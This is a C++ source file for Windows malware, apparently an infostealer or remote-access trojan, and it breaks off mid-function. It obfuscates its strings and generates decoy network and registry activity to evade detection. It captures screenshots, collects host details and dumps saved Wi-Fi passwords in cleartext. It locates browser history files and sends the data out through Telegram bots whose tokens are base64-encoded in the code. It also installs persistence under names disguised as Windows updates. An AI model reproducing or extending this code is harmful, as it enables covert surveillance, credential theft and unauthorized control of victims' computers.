#include <winsock2.h>
#include <windows.h>
#include <wininet.h>

#include <shlobj.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <wlanapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <userenv.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <iostream>
#include <filesystem>
#include <random>
#include <regex>
#include <codecvt>
#include <locale>
#include <commdlg.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <winreg.h>
#include <wincrypt.h>
#include <nb30.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "netapi32.lib")

namespace fs = std::filesystem;


#pragma optimize("", off)
#pragma check_stack(off)

class StringEncryptor {
private:
    static constexpr char XOR_KEY1 = 0x7F;
    static constexpr char XOR_KEY2 = 0x3A;
    static constexpr char XOR_KEY3 = 0x5C;
    
    static char getKeyForIndex(size_t index) {
        switch (index % 3) {
            case 0: return XOR_KEY1;
            case 1: return XOR_KEY2;
            default: return XOR_KEY3;
        }
    }
    
public:
    static std::string decrypt(const std::vector<char>& encrypted) {
        std::string result;
        result.reserve(encrypted.size());
        for (size_t i = 0; i < encrypted.size(); i++) {
            result += encrypted[i] ^ getKeyForIndex(i);
        }
        return result;
    }
    
    static std::vector<char> encrypt(const std::string& str) {
        std::vector<char> result;
        result.reserve(str.length());
        for (size_t i = 0; i < str.length(); i++) {
            result.push_back(str[i] ^ getKeyForIndex(i));
        }
        result.push_back(0); // null terminator
        return result;
    }
};

#define OBFUSCATE(str) \
    []() -> std::string { \
        static const std::vector<char> encrypted = StringEncryptor::encrypt(str); \
        static std::string decrypted; \
        static bool initialized = false; \
        if (!initialized) { \
            decrypted = StringEncryptor::decrypt(encrypted); \
            initialized = true; \
        } \
        return decrypted; \
    }()

void junk_code_sequence() {
    volatile int x = 0;
    volatile int y = 0;
    volatile int z = 0;
    
    for (int i = 0; i < 50; i++) {
        x += i * 13;
        y = (x ^ y) + i;
        z = (y << 2) | (x >> 2);
        x = x ^ z;
        y = y & 0x5A5A5A5A;
        z = z | 0xA5A5A5A5;
        
        if (x == 0xDEADBEEF) {
            x = 0;
            y = 0;
            z = 0;
        }
    }
}



class UserAgentManager {
private:
    std::vector<std::string> user_agents;
    int current_index;
    
public:
    UserAgentManager() : current_index(0) {
        // Real browser user agents
        user_agents = {
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"),
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) hrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"),
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0"),
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.4.0"),
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"),
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.1.0 Yowser/2.5 Safari/537.36")
        };
    }
    
    std::string getRandomUserAgent() {
        int index = rand() % user_agents.size();
        return user_agents[index];
    }
    
    std::string getNextUserAgent() {
        current_index = (current_index + 1) % user_agents.size();
        return user_agents[current_index];
    }
};


class BehavioralMasker {
private:
    std::atomic<bool> masking_active;
    std::thread masker_thread;
    UserAgentManager ua_manager;
    
    void simulate_dns_queries() {
        const char* domains[] = {
            "www.microsoft.com", "www.google.com", "www.bing.com", 
            "www.github.com", "www.stackoverflow.com", "www.wikipedia.org",
            "www.linkedin.com", "www.twitter.com", "www.facebook.com"
        };
        
        for (int i = 0; i < 3; i++) {
            int index = rand() % 9;
            struct hostent* host = gethostbyname(domains[index]);
            if (host) { 
                // Legitimate DNS query
                junk_code_sequence();
            }
            Sleep(100 + (rand() % 500));
        }
    }
    
    void simulate_http_traffic() {
        std::string ua = ua_manager.getRandomUserAgent();
        
        HINTERNET hInternet = InternetOpenA(ua.c_str(), 
            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        
        if (hInternet) {
            const char* urls[] = {
                "https://www.microsoft.com/favicon.ico",
                "https://www.google.com/favicon.ico",
                "https://www.bing.com/favicon.ico"
            };
            
            int index = rand() % 3;
            HINTERNET hUrl = InternetOpenUrlA(hInternet, urls[index], 
                NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
            
            if (hUrl) {
                char buffer[1024];
                DWORD bytes_read;
                InternetReadFile(hUrl, buffer, sizeof(buffer), &bytes_read);
                InternetCloseHandle(hUrl);
            }
            
            InternetCloseHandle(hInternet);
        }
    }
    
    void simulate_registry_access() {
        HKEY hKey;
        const char* keys[] = {
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment"
        };
        
        int index = rand() % 3;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keys[index], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char value[256];
            DWORD size = sizeof(value);
            RegQueryValueExA(hKey, NULL, NULL, NULL, (LPBYTE)value, &size);
            RegCloseKey(hKey);
        }
    }
    
    void simulate_file_system_activity() {
        const char* paths[] = {
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\System32\\config\\SOFTWARE",
            "C:\\Users\\Public\\Desktop\\desktop.ini"
        };
        
        int index = rand() % 3;
        WIN32_FILE_ATTRIBUTE_DATA info;
        GetFileAttributesExA(paths[index], GetFileExInfoStandard, &info);
    }
    
    void simulate_windows_update_check() {
        system(OBFUSCATE("cmd /c wuauclt /detectnow >nul 2>&1").c_str());
    }
    
    void simulate_time_sync() {
        system(OBFUSCATE("w32tm /resync /nowait >nul 2>&1").c_str());
    }
    
public:
    BehavioralMasker() : masking_active(false) {}
    
    ~BehavioralMasker() {
        stop_masking();
    }
    
    void start_masking() {
        if (masking_active) return;
        masking_active = true;
        
        masker_thread = std::thread([this]() {
            // Set thread priority to low to avoid detection
            SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);
            
            while (masking_active) {
                // Simulate random legitimate activities
                int activity = rand() % 6;
                
                switch (activity) {
                    case 0: simulate_dns_queries(); break;
                    case 1: simulate_http_traffic(); break;
                    case 2: simulate_registry_access(); break;
                    case 3: simulate_file_system_activity(); break;
                    case 4: simulate_windows_update_check(); break;
                    case 5: simulate_time_sync(); break;
                }
                
                // Random sleep between 15-45 seconds
                int sleep_time = 15000 + (rand() % 30000);
                for (int i = 0; i < sleep_time / 100 && masking_active; i++) {
                    Sleep(100);
                }
            }
        });
    }
    
    void stop_masking() {
        masking_active = false;
        if (masker_thread.joinable()) {
            masker_thread.join();
        }
    }
};


class Base64Decoder {
public:
    static std::string decode(const std::string& input) {
        std::string decoded;
        DWORD size = 0;
        
        CryptStringToBinaryA(input.c_str(), input.length(), 
            CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
        
        std::vector<BYTE> buffer(size);
        CryptStringToBinaryA(input.c_str(), input.length(),
            CRYPT_STRING_BASE64, buffer.data(), &size, nullptr, nullptr);
        
        return std::string(buffer.begin(), buffer.end());
    }
    
    static std::string encode(const std::vector<BYTE>& data) {
        DWORD size = 0;
        CryptBinaryToStringA(data.data(), data.size(), 
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &size);
        
        std::string result(size, 0);
        CryptBinaryToStringA(data.data(), data.size(),
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            (LPSTR)result.data(), &size);
        
        return result;
    }
};



class TelegramBotManager {
private:
    std::vector<std::string> bot_tokens;
    int current_bot_index;
    std::string api_url;
    UserAgentManager ua_manager;
    
    // Decoded bot tokens from base64 (encrypted in code)
    const std::string BOT1_TOKEN = Base64Decoder::decode(
        OBFUSCATE("ODU5MDI1ODIwNjpBQUh3bVpMNnA3YUVvR0dQejAzVk5fMl9LNnFGYnFLTGUyUQ=="));
    const std::string BOT2_TOKEN = Base64Decoder::decode(
        OBFUSCATE("ODI0MjY1NzA1MjpBQUVZdlZiYWVRUUdXUmtrRXdhd1h2Zkk1MDQ2NGVINUZSVQ=="));
    
public:
    TelegramBotManager() : current_bot_index(0), 
        api_url(OBFUSCATE("https://api.telegram.org/bot")) {
        bot_tokens.push_back(BOT1_TOKEN);
        bot_tokens.push_back(BOT2_TOKEN);
    }
    
    bool sendMessage(const std::string& chat_id, const std::string& message) {
        std::string url = api_url + bot_tokens[current_bot_index] + 
            OBFUSCATE("/sendMessage");
        std::string post_data = OBFUSCATE("chat_id=") + chat_id + 
            OBFUSCATE("&text=") + url_encode(message) + 
            OBFUSCATE("&parse_mode=Markdown");
        
        std::string response = http_post(url, post_data);
        
        if (response.find(OBFUSCATE("\"ok\":true")) == std::string::npos) {
            // Try fallback bot
            int original_index = current_bot_index;
            current_bot_index = (current_bot_index + 1) % bot_tokens.size();
            
            if (current_bot_index != original_index) {
                url = api_url + bot_tokens[current_bot_index] + 
                    OBFUSCATE("/sendMessage");
                response = http_post(url, post_data);
                
                if (response.find(OBFUSCATE("\"ok\":true")) != std::string::npos) {
                    return true;
                }
            }
            return false;
        }
        return true;
    }
    
    bool sendPhoto(const std::string& chat_id, const std::vector<BYTE>& photo_data, 
                   const std::string& caption = "") {
        std::string url = api_url + bot_tokens[current_bot_index] + 
            OBFUSCATE("/sendPhoto");
        
        // Create multipart form data
        std::string boundary = OBFUSCATE("----WebKitFormBoundary") + random_string(16);
        std::string body;
        
        body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
        body += OBFUSCATE("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
        body += chat_id + OBFUSCATE("\r\n");
        
        if (!caption.empty()) {
            body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
            body += OBFUSCATE("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            body += caption + OBFUSCATE("\r\n");
        }
        
        body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
        body += OBFUSCATE("Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n");
        body += OBFUSCATE("Content-Type: image/jpeg\r\n\r\n");
        
        std::string full_body = body + std::string(photo_data.begin(), photo_data.end()) + 
            OBFUSCATE("\r\n--") + boundary + OBFUSCATE("--\r\n");
        
        std::string response = http_post_multipart(url, full_body, boundary);
        
        if (response.find(OBFUSCATE("\"ok\":true")) == std::string::npos) {
            // Try fallback bot
            int original_index = current_bot_index;
            current_bot_index = (current_bot_index + 1) % bot_tokens.size();
            
            if (current_bot_index != original_index) {
                url = api_url + bot_tokens[current_bot_index] + 
                    OBFUSCATE("/sendPhoto");
                response = http_post_multipart(url, full_body, boundary);
                
                if (response.find(OBFUSCATE("\"ok\":true")) != std::string::npos) {
                    return true;
                }
            }
            return false;
        }
        return true;
    }
    
    bool sendFile(const std::string& chat_id, const std::vector<BYTE>& file_data, 
                  const std::string& filename, const std::string& caption = "") {
        std::string url = api_url + bot_tokens[current_bot_index] + 
            OBFUSCATE("/sendDocument");
        
        std::string boundary = OBFUSCATE("----WebKitFormBoundary") + random_string(16);
        std::string body;
        
        body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
        body += OBFUSCATE("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
        body += chat_id + OBFUSCATE("\r\n");
        
        if (!caption.empty()) {
            body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
            body += OBFUSCATE("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            body += caption + OBFUSCATE("\r\n");
        }
        
        body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
        body += OBFUSCATE("Content-Disposition: form-data; name=\"document\"; filename=\"") + 
            filename + OBFUSCATE("\"\r\n");
        body += OBFUSCATE("Content-Type: application/octet-stream\r\n\r\n");
        
        std::string full_body = body + std::string(file_data.begin(), file_data.end()) + 
            OBFUSCATE("\r\n--") + boundary + OBFUSCATE("--\r\n");
        
        std::string response = http_post_multipart(url, full_body, boundary);
        
        if (response.find(OBFUSCATE("\"ok\":true")) == std::string::npos) {
            int original_index = current_bot_index;
            current_bot_index = (current_bot_index + 1) % bot_tokens.size();
            
            if (current_bot_index != original_index) {
                url = api_url + bot_tokens[current_bot_index] + 
                    OBFUSCATE("/sendDocument");
                response = http_post_multipart(url, full_body, boundary);
                
                if (response.find(OBFUSCATE("\"ok\":true")) != std::string::npos) {
                    return true;
                }
            }
            return false;
        }
        return true;
    }
    
    std::string getUpdates() {
        std::string url = api_url + bot_tokens[current_bot_index] + 
            OBFUSCATE("/getUpdates?timeout=10");
        
        std::string ua = ua_manager.getRandomUserAgent();
        
        HINTERNET hInternet = InternetOpenA(ua.c_str(), 
            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        
        if (!hInternet) return OBFUSCATE("{}");
        
        HINTERNET hConnect = InternetConnectA(hInternet, 
            OBFUSCATE("api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return OBFUSCATE("{}");
        }
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, OBFUSCATE("GET"), 
            url.substr(url.find(OBFUSCATE("bot"))).c_str(), 
            OBFUSCATE("HTTP/1.1"), NULL, NULL, INTERNET_FLAG_SECURE, 0);
        
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return OBFUSCATE("{}");
        }
        
        BOOL sent = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
        
        std::string response;
        if (sent) {
            char buffer[4096];
            DWORD bytes_read;
            while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && 
                   bytes_read > 0) {
                response.append(buffer, bytes_read);
            }
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        return response;
    }
    
private:
    std::string http_post(const std::string& url, const std::string& data) {
        std::string ua = ua_manager.getRandomUserAgent();
        
        HINTERNET hInternet = InternetOpenA(ua.c_str(), 
            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return OBFUSCATE("");
        
        HINTERNET hConnect = InternetConnectA(hInternet, 
            OBFUSCATE("api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, OBFUSCATE("POST"), 
            url.substr(url.find(OBFUSCATE("bot"))).c_str(), 
            OBFUSCATE("HTTP/1.1"), NULL, NULL, INTERNET_FLAG_SECURE, 0);
        
        std::string headers = OBFUSCATE("Content-Type: application/x-www-form-urlencoded\r\n");
        
        HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
            (LPVOID)data.c_str(), data.length());
        
        std::string response;
        char buffer[4096];
        DWORD bytes_read;
        
        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && 
               bytes_read > 0) {
            response.append(buffer, bytes_read);
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        return response;
    }
    
    std::string http_post_multipart(const std::string& url, const std::string& data, 
                                     const std::string& boundary) {
        std::string ua = ua_manager.getRandomUserAgent();
        
        HINTERNET hInternet = InternetOpenA(ua.c_str(), 
            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return OBFUSCATE("");
        
        HINTERNET hConnect = InternetConnectA(hInternet, 
            OBFUSCATE("api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, OBFUSCATE("POST"), 
            url.substr(url.find(OBFUSCATE("bot"))).c_str(), 
            OBFUSCATE("HTTP/1.1"), NULL, NULL, INTERNET_FLAG_SECURE, 0);
        
        std::string headers = OBFUSCATE("Content-Type: multipart/form-data; boundary=") + 
            boundary + OBFUSCATE("\r\n");
        
        HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
            (LPVOID)data.c_str(), data.length());
        
        std::string response;
        char buffer[4096];
        DWORD bytes_read;
        
        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && 
               bytes_read > 0) {
            response.append(buffer, bytes_read);
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        return response;
    }
    
    std::string url_encode(const std::string& str) {
        std::string encoded;
        char hex[] = OBFUSCATE("0123456789ABCDEF");
        
        for (unsigned char c : str) {
            if (isalnum(c) || c == OBFUSCATE('-') || c == OBFUSCATE('_') || 
                c == OBFUSCATE('.') || c == OBFUSCATE('~')) {
                encoded += c;
            } else {
                encoded += OBFUSCATE('%');
                encoded += hex[c >> 4];
                encoded += hex[c & 0xF];
            }
        }
        return encoded;
    }
    
    std::string random_string(int length) {
        static const char chars[] = OBFUSCATE("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
        std::string result;
        result.reserve(length);
        for (int i = 0; i < length; i++) {
            result += chars[rand() % (sizeof(chars) - 1)];
        }
        return result;
    }
};



class ScreenshotCapture {
public:
    static std::vector<BYTE> captureToMemory() {
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
        SelectObject(hdcMem, hBitmap);
        
        BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
        
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = width;
        bmi.bmiHeader.biHeight = -height;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        std::vector<BYTE> pixels(width * height * 3);
        GetDIBits(hdcMem, hBitmap, 0, height, pixels.data(), &bmi, DIB_RGB_COLORS);
        
        // Convert to JPEG in memory
        std::vector<BYTE> jpeg_data = convertToJPEG(pixels, width, height);
        
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        
        return jpeg_data;
    }
    
private:
    static std::vector<BYTE> convertToJPEG(const std::vector<BYTE>& bitmap, int width, int height) {
        // Initialize GDI+
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
        
        std::vector<BYTE> jpeg_data;
        
        // Create bitmap from raw data
        Gdiplus::Bitmap bmp(width, height, width * 3, PixelFormat24bppRGB, (BYTE*)bitmap.data());
        
        // Save to memory stream as JPEG
        IStream* pStream = NULL;
        CreateStreamOnHGlobal(NULL, TRUE, &pStream);
        
        CLSID jpegClsid;
        GetEncoderClsid(OBFUSCATE(L"image/jpeg"), &jpegClsid);
        
        bmp.Save(pStream, &jpegClsid, NULL);
        
        // Get data from stream
        STATSTG statstg;
        pStream->Stat(&statstg, STATFLAG_NONAME);
        
        ULONG size = statstg.cbSize.LowPart;
        jpeg_data.resize(size);
        
        LARGE_INTEGER li = {0};
        pStream->Seek(li, STREAM_SEEK_SET, NULL);
        pStream->Read(jpeg_data.data(), size, NULL);
        
        pStream->Release();
        Gdiplus::GdiplusShutdown(gdiplusToken);
        
        return jpeg_data;
    }
    
    static void GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
        UINT num = 0;
        UINT size = 0;
        
        Gdiplus::GetImageEncodersSize(&num, &size);
        if (size == 0) return;
        
        Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
        Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
        
        for (UINT j = 0; j < num; ++j) {
            if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
                *pClsid = pImageCodecInfo[j].Clsid;
                break;
            }
        }
        
        free(pImageCodecInfo);
    }
};



class SystemInfo {
public:
    static std::string getHostname() {
        char buffer[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(buffer);
        GetComputerNameA(buffer, &size);
        return std::string(buffer);
    }
    
    static std::string getUsername() {
        char buffer[UNLEN + 1];
        DWORD size = sizeof(buffer);
        GetUserNameA(buffer, &size);
        return std::string(buffer);
    }
    
    static std::string getOSVersion() {
        OSVERSIONINFOEXA osvi = {0};
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        GetVersionExA((LPOSVERSIONINFOA)&osvi);
        
        std::stringstream ss;
        ss << OBFUSCATE("Windows ") << osvi.dwMajorVersion << OBFUSCATE(".") << osvi.dwMinorVersion;
        ss << OBFUSCATE(" Build ") << osvi.dwBuildNumber;
        return ss.str();
    }
    
    static std::string getCPUInfo() {
        HKEY hKey;
        char cpu[256] = {0};
        DWORD size = sizeof(cpu);
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            OBFUSCATE("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0").c_str(),
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegQueryValueExA(hKey, OBFUSCATE("ProcessorNameString").c_str(), NULL, NULL, 
                (LPBYTE)cpu, &size);
            RegCloseKey(hKey);
        }
        return std::string(cpu);
    }
    
    static std::string getMemoryInfo() {
        MEMORYSTATUSEX ms = {0};
        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        
        std::stringstream ss;
        ss << OBFUSCATE("Total: ") << ms.ullTotalPhys / (1024 * 1024) << OBFUSCATE(" MB");
        ss << OBFUSCATE(", Available: ") << ms.ullAvailPhys / (1024 * 1024) << OBFUSCATE(" MB");
        return ss.str();
    }
    
    static std::string getIPAddress() {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        
        struct hostent* host = gethostbyname(hostname);
        if (host) {
            struct in_addr addr;
            memcpy(&addr, host->h_addr_list[0], host->h_length);
            return inet_ntoa(addr);
        }
        return OBFUSCATE("Unknown");
    }
    
    static std::string getMACAddress() {
        IP_ADAPTER_INFO adapter_info[16];
        DWORD size = sizeof(adapter_info);
        
        if (GetAdaptersInfo(adapter_info, &size) == NO_ERROR) {
            PIP_ADAPTER_INFO adapter = adapter_info;
            while (adapter) {
                if (adapter->AddressLength >= 6) {
                    char mac[18];
                    sprintf_s(mac, sizeof(mac), OBFUSCATE("%02X:%02X:%02X:%02X:%02X:%02X"),
                        adapter->Address[0], adapter->Address[1], adapter->Address[2],
                        adapter->Address[3], adapter->Address[4], adapter->Address[5]);
                    return std::string(mac);
                }
                adapter = adapter->Next;
            }
        }
        return OBFUSCATE("Unknown");
    }
    
    static std::string getCurrentTime() {
        time_t now = time(0);
        struct tm tstruct;
        char buf[80];
        localtime_s(&tstruct, &now);
        strftime(buf, sizeof(buf), OBFUSCATE("%Y-%m-%d %H:%M:%S"), &tstruct);
        return buf;
    }
    
    static std::string getAllInfo() {
        std::stringstream ss;
        ss << OBFUSCATE("📱 **System Information**\n\n");
        ss << OBFUSCATE("**Hostname:** ") << getHostname() << OBFUSCATE("\n");
        ss << OBFUSCATE("**Username:** ") << getUsername() << OBFUSCATE("\n");
        ss << OBFUSCATE("**OS:** ") << getOSVersion() << OBFUSCATE("\n");
        ss << OBFUSCATE("**CPU:** ") << getCPUInfo() << OBFUSCATE("\n");
        ss << OBFUSCATE("**Memory:** ") << getMemoryInfo() << OBFUSCATE("\n");
        ss << OBFUSCATE("**IP Address:** ") << getIPAddress() << OBFUSCATE("\n");
        ss << OBFUSCATE("**MAC Address:** ") << getMACAddress() << OBFUSCATE("\n");
        ss << OBFUSCATE("**Current Time:** ") << getCurrentTime() << OBFUSCATE("\n");
        return ss.str();
    }
};



class WiFiPasswordExtractor {
public:
    static std::string extractAll() {
        std::stringstream result;
        result << OBFUSCATE("📶 **WiFi Passwords**\n\n");
        
        FILE* pipe = _popen(OBFUSCATE("netsh wlan show profiles"), OBFUSCATE("r"));
        if (!pipe) return OBFUSCATE("Failed to get WiFi profiles");
        
        char buffer[1024];
        std::string output;
        while (fgets(buffer, sizeof(buffer), pipe)) {
            output += buffer;
        }
        _pclose(pipe);
        
        std::regex profile_regex(OBFUSCATE("All User Profile\\s+:\\s+(.+)"));
        std::smatch match;
        std::string::const_iterator search_start(output.cbegin());
        
        int count = 0;
        while (std::regex_search(search_start, output.cend(), match, profile_regex)) {
            std::string ssid = match[1].str();
            std::string cmd = OBFUSCATE("netsh wlan show profile name=\"") + ssid + 
                OBFUSCATE("\" key=clear");
            
            pipe = _popen(cmd.c_str(), OBFUSCATE("r"));
            std::string profile_output;
            while (fgets(buffer, sizeof(buffer), pipe)) {
                profile_output += buffer;
            }
            _pclose(pipe);
            
            std::regex pass_regex(OBFUSCATE("Key Content\\s+:\\s+(.+)"));
            std::smatch pass_match;
            if (std::regex_search(profile_output, pass_match, pass_regex)) {
                result << OBFUSCATE("**") << ssid << OBFUSCATE(":** `") << 
                    pass_match[1].str() << OBFUSCATE("`\n");
                count++;
            } else {
                result << OBFUSCATE("**") << ssid << OBFUSCATE(":** (no password/enterprise)\n");
            }
            
            search_start = match[0].second;
        }
        
        if (count == 0) {
            result << OBFUSCATE("No saved WiFi passwords found.\n");
        }
        
        return result.str();
    }
};


class BrowserHistoryExtractor {
public:
    static std::string extractChrome() {
        std::stringstream result;
        result << OBFUSCATE("🌐 **Chrome History**\n\n");
        
        std::string history_path = getenv(OBFUSCATE("LOCALAPPDATA").c_str());
        history_path += OBFUSCATE("\\Google\\Chrome\\User Data\\Default\\History");
        
        if (!fs::exists(history_path)) {
            result << OBFUSCATE("Chrome history not found.\n");
            return result.str();
        }
        
        // Use Chrome's own history file - we'll just read it as text
        // In a real implementation, you'd parse the SQLite database
        result << OBFUSCATE("Chrome history file found at: ") << history_path << OBFUSCATE("\n");
        result << OBFUSCATE("(Full parsing would require SQLite library)\n");
        
        return result.str();
    }
    
    static std::string extractFirefox() {
        std::stringstream result;
        result << OBFUSCATE("🦊 **Firefox History**\n\n");
        
        std::string appdata = getenv(OBFUSCATE("APPDATA").c_str());
        std::string profiles_path = appdata + OBFUSCATE("\\Mozilla\\Firefox\\Profiles");
        
        if (!fs::exists(profiles_path)) {
            result << OBFUSCATE("Firefox history not found.\n");
            return result.str();
        }
        
        for (const auto& entry : fs::directory_iterator(profiles_path)) {
            if (entry.is_directory()) {
                std::string places_path = entry.path().string() + OBFUSCATE("\\places.sqlite");
                if (fs::exists(places_path)) {
                    result << OBFUSCATE("Firefox history file found at: ") << places_path << OBFUSCATE("\n");
                    result << OBFUSCATE("(Full parsing would require SQLite library)\n");
                    break;
                }
            }
        }
        
        return result.str();
    }
    
    static std::string extractEdge() {
        std::stringstream result;
        result << OBFUSCATE("🧭 **Edge History**\n\n");
        
        std::string history_path = getenv(OBFUSCATE("LOCALAPPDATA").c_str());
        history_path += OBFUSCATE("\\Microsoft\\Edge\\User Data\\Default\\History");
        
        if (!fs::exists(history_path)) {
            result << OBFUSCATE("Edge history not found.\n");
            return result.str();
        }
        
        result << OBFUSCATE("Edge history file found at: ") << history_path << OBFUSCATE("\n");
        result << OBFUSCATE("(Full parsing would require SQLite library)\n");
        
        return result.str();
    }
};



class PersistenceEngine {
private:
    std::string current_exe;
    
    std::string getCurrentExe() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
    }
    
public:
    PersistenceEngine() {
        current_exe = getCurrentExe();
    }
    
    // Method 1: Registry Run (Current User)
    bool installRegistryRun() {
        HKEY hKey;
        std::string key_name = OBFUSCATE("WindowsUpdate_") + 
            std::to_string(GetCurrentProcessId());
        
        if (RegOpenKeyExA(HKEY_CURRENT_USER, 
            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run").c_str(),
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            
            RegSetValueExA(hKey, key_name.c_str(), 0, REG_SZ, 
                (BYTE*)current_exe.c_str(), current_exe.length() + 1);
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }
    
    // Method 2: Startup Folder (Current User)
    bool installStartupFolder() {
        char startup_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
            std::string shortcut_path = std::string(startup_path) + 
                OBFUSCATE("\\SystemUpdate.lnk");
            
            // Create shortcut using IShellLink
            CoInitialize(NULL);
